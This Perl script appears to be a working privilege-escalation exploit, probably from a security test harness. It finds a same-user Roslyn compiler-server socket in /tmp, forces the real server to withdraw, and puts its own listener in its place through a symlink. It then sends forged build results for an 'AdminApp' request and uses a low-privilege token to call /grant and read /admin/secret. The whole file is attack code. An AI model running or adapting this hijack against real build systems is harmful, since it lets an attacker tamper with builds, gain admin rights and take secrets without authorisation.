use strict;
use warnings;
use Digest::SHA qw(sha256_hex);
use Encode qw(encode);
use Errno qw(ECONNREFUSED);
use IO::Socket::INET;
use IO::Socket::UNIX;
use Socket qw(SOCK_STREAM);
use Time::HiRes qw(usleep);

$| = 1;

my $mode = $ARGV[0] // 'completed';
die "MODE must be completed or malformed\n" unless $mode eq 'completed' || $mode eq 'malformed';
my $port = $ARGV[1] // 0;
opendir(my $tmp, '/tmp') or die "open shared tmp: $!\n";
my @candidate = grep {
    my $path = '/tmp/' . $_;
    /^[A-Za-z0-9_-]{43}$/ && -S $path && (stat($path))[4] == $<;
} readdir($tmp);
closedir($tmp);
print "DISCOVERED_SAME_UID_ROSLYN_SOCKET_COUNT=" . scalar(@candidate) . "\n";
die "ambiguous or absent same-UID compiler socket\n" unless @candidate == 1;
my $name = $candidate[0];
my $global = '/tmp/' . $name;
my $local_dir = '/tmp/eop062-rank20-sidecar';
my $local = $local_dir . '/' . $name;

print "PIPE_NAME=$name MODE=$mode EUID=$<\n";
if ($ENV{EOP062_WITHDRAW}) {
    die "genuine compiler socket absent before actor withdrawal\n" unless -S $global;
    my $peer = IO::Socket::UNIX->new(Type => SOCK_STREAM, Peer => $global, Timeout => 2)
        or die "actor incomplete-request connect: $!\n";
    close($peer);
    print "ACTOR_CLOSED_INCOMPLETE_REQUEST\n";
    for (1 .. 100) {
        last unless -S $global;
        usleep(100000);
    }
    die "genuine compiler socket stayed present after actor disconnect\n" if -S $global;
    print "ACTOR_SERVER_WITHDRAWN\n";
}
for my $probe (
    ['DIRECT_SOURCE_READ', '/src/admin/Program.cs', '<'],
    ['DIRECT_MARKER_WRITE', '/src/admin/protected-admin-marker.txt', '>>'],
) {
    my ($label, $path, $op) = @$probe;
    if (open(my $handle, $op, $path)) {
        close $handle;
        die "$label=ALLOWED; refusing to continue\n";
    }
    print "$label=DENIED errno=" . (0 + $!) . " message=$!\n";
}

mkdir($local_dir, 0700) unless -d $local_dir;
die "local_dir owner mismatch\n" unless (stat($local_dir))[4] == $<;

sub remove_stale_socket {
    my ($path, $label) = @_;
    my @info = lstat($path);
    return unless @info;
    die "$label not a socket\n" unless -S _;
    die "$label owner mismatch\n" unless $info[4] == $<;
    my $probe = IO::Socket::UNIX->new(Type => SOCK_STREAM, Peer => $path, Timeout => 1);
    if ($probe) {
        close $probe;
        die "$label active; preserving it\n";
    }
    die "$label unknown connect result: $!\n" unless $! == ECONNREFUSED;
    unlink($path) or die "unlink stale $label: $!\n";
    print "STALE_REMOVED label=$label inode=$info[1]\n";
}

remove_stale_socket($local, 'local');
remove_stale_socket($global, 'global');
my $server = IO::Socket::UNIX->new(Type => SOCK_STREAM, Local => $local, Listen => 8)
    or die "bind local: $!\n";
symlink($local, $global) or die "symlink global: $!\n";
print "READY global=$global local=$local\n";

sub read_exact {
    my ($fh, $length) = @_;
    my $data = '';
    while (length($data) < $length) {
        my $n = sysread($fh, my $part, $length - length($data));
        die "short read: $!\n" unless defined($n) && $n > 0;
        $data .= $part;
    }
    return $data;
}

sub write_all {
    my ($fh, $bytes) = @_;
    my $offset = 0;
    while ($offset < length($bytes)) {
        my $n = syswrite($fh, $bytes, length($bytes) - $offset, $offset);
        die "short write: $!\n" unless defined($n) && $n > 0;
        $offset += $n;
    }
}

my $client = $server->accept() or die "accept: $!\n";
my $length = unpack('V', read_exact($client, 4));
die "invalid request length=$length\n" if $length <= 0 || $length > 4000000;
my $request = read_exact($client, $length);
my $target = index($request, encode('UTF-16LE', 'AdminApp')) >= 0;
print "REQUEST length=$length target=" . ($target ? 1 : 0) . "\n";
die "non-target request; no fake success sent\n" unless $target;

if ($mode eq 'completed') {
    my $payload = pack('V', 1) . pack('V', 0) . pack('C', 0) . pack('V', 0) . pack('V', 0);
    write_all($client, pack('V', length($payload)) . $payload);
    print "SENT_COMPLETED_ZERO\n";
} else {
    write_all($client, pack('l<', -1));
    print "SENT_MALFORMED_LENGTH\n";
}
close($client);
close($server);
unlink($global) or die "unlink global after response: $!\n";
unlink($local) or die "unlink local after response: $!\n";

if ($port) {
    my $low = $ENV{EOP062_LOW_TOKEN} // die "actor low credential missing\n";
    sub actor_http {
        my ($method, $path, $port, $low) = @_;
        my $http;
        for (1 .. 600) {
            $http = IO::Socket::INET->new(PeerAddr => ($ENV{EOP062_VICTIM_HOST} // '127.0.0.1'), PeerPort => $port,
                                          Proto => 'tcp', Timeout => 1);
            last if $http;
            usleep(100000);
        }
        die "actor HTTP timeout\n" unless $http;
        write_all($http, "$method $path HTTP/1.1\r\nHost: 127.0.0.1\r\nAuthorization: Bearer $low\r\nContent-Length: 0\r\nConnection: close\r\n\r\n");
        my $reply = '';
        while (1) {
            my $n = sysread($http, my $part, 8192);
            die "actor HTTP read failed: $!\n" unless defined $n;
            last if $n == 0;
            $reply .= $part;
        }
        close($http);
        my ($status) = $reply =~ /^HTTP\/1\.1\s+(\d+)/;
        die "actor HTTP missing status\n" unless $status;
        my ($headers, $body) = split(/\r\n\r\n/, $reply, 2);
        if (defined($body) && $headers =~ /transfer-encoding:\s*chunked/i) {
            my $decoded = '';
            while ($body =~ s/^([0-9a-fA-F]+)\r\n//) {
                my $n = hex($1);
                last if $n == 0;
                die "actor HTTP short chunk\n" if length($body) < $n + 2;
                $decoded .= substr($body, 0, $n);
                substr($body, 0, $n + 2, '');
            }
            $body = $decoded;
        }
        return ($status, defined($body) ? $body : '');
    }
    my ($before) = actor_http('POST', '/admin', $port, $low);
    my ($grant) = actor_http('POST', '/grant', $port, $low);
    my ($after) = actor_http('POST', '/admin', $port, $low);
    my ($read, $secret_body) = actor_http('GET', '/admin/secret', $port, $low);
    print "ACTOR_BEFORE_ADMIN=$before\n";
    print "ACTOR_GRANT=$grant\n";
    print "ACTOR_AFTER_ADMIN=$after\n";
    print "ACTOR_SECRET_STATUS=$read\n";
    print "ACTOR_SECRET_SHA256=" . sha256_hex($secret_body) . "\n" if $read == 200;
}

print "ACTOR_DONE\n";
